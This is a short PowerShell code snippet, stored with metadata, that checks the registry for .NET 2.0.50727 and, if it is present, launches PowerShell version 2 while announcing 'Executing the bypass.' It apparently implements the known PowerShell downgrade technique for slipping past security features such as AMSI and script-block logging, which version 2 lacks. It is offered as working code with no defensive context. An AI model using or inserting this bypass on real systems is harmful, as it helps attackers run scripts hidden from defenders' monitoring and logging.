---
id: 3d0cdb89-54b9-4785-8326-b799df734331
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:26.092157+00:00'
updated_at: '2023-04-10T20:36:19.400813+00:00'
---

# Code Snippet 3d0cdb89

**Language**: ps1

```ps1
if ($ShowOnly -eq $True)
{
        Write-Output "If .Net version 2.0.50727 is installed, run powershell -v 2 and run scripts from the new PowerShell process."
}
else
{
        Write-Verbose "Checking if .Net version 2.0.50727 is installed."
        $versions = Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -recurse | Get-ItemProperty -name Version -EA 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select -ExpandProperty Version
    if($versions -match "2.0.50727")
    {
            Write-Verbose ".Net version 2.0.50727 found."
            Write-Output "Executing the bypass."
            powershell.exe -version 2
    }
    else
    {
            Write-Verbose ".Net version 2.0.50727 not found. Can't start PowerShell v2."
    }
}
```


